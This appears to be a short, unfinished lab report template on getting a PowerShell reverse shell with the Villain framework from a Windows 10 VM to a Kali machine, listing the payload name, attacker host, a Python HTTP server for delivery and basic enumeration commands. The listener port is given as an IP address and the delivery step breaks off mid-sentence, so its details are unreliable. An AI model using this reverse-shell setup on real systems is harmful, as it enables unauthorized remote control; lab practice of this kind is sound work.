# Villain Framework Reverse Shell Report

## ⚙️ Setup Info
- Payload: `windows/reverse_tcp/powershell`
- LHOST: 192.168.56.1
- LPORT: 192.168.56.101

## 🔁 Payload Delivery Method
- he payload  was hosted on the Kali attacker machine via Python’s built-in HTTP server (python3 -m http.server 8000).
On the Windows 10 target VM, PowerShell 

## 🖥️ Captured Info
- Hostname: _value_
- IP Address: _value_
- User: _value_

## 🔎 Enumeration Performed
```powershell
whoami
ipconfig
systeminfo